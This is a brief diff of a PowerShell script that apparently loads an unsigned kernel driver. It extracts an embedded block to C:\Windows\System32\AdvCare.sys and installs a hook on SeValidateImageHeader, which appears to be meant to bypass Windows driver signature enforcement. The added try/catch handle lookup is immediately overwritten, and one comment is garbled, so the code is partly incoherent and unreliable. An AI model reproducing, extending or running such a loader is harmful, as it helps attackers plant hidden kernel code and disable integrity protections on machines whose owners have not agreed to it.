@@ -1,4 +1,4 @@
-function Import-EmbeddedBlock {
+function Import-EmbeddedBlock-v2 {
     [CmdletBinding(DefaultParameterSetName = "ToFile")]
     param (
         [Parameter(Mandatory=$true, Position=0)]
@@ -182,7 +182,11 @@ Write-Host
 
 # Try 0x20 on Case of ... <>
 $Global:Offset = 0x20
-Import-EmbeddedBlock -BlockName AdvCareUn -OutPath C:\Windows\System32\AdvCare.sys
+Import-EmbeddedBlock-v2 -BlockName AdvCareUn -OutPath C:\Windows\System32\AdvCare.sys
+
+try {
+    $handle = Get-FileHandle -FileName AdvCare
+} catch {}
 
 $handle = 0
 Invoke-SeValidateImageHeaderHook-v2 -Install
